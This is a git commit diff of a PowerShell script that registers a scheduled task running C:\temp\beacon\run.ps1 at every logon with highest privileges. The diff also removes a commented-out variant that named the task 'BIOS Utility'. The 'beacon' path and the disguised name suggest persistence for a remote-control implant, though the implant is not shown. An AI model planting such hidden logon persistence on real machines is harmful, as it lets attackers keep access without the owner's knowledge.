bbf7e1f74132614efea0fe707f6fad8e9a6f44c4
elias <emmaline131@wireconnected.com>
2024-01-30 17:53:49 +0700

    task

--- task.ps1
+++ task.ps1
@@ -1,15 +1,4 @@
-# $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "C:\temp\beacon\run.ps1"
-# $Trigger = New-ScheduledTaskTrigger -AtLogOn
-# Set-ScheduledTask -Action $Action -Trigger $Trigger -TaskName "BIOS Utility"
-
-# Specify the path to your PowerShell script
 $scriptPath = "C:\temp\beacon\run.ps1"
-
-# Specify the action to run the script
 $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-File `"$scriptPath`""
-
-# Specify the trigger for the login event
 $trigger = New-ScheduledTaskTrigger -AtLogon
-
-# Register the scheduled task
 Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "RunScriptOnLogin" -Description "Runs a PowerShell script when a user logs in" -RunLevel Highest -Force
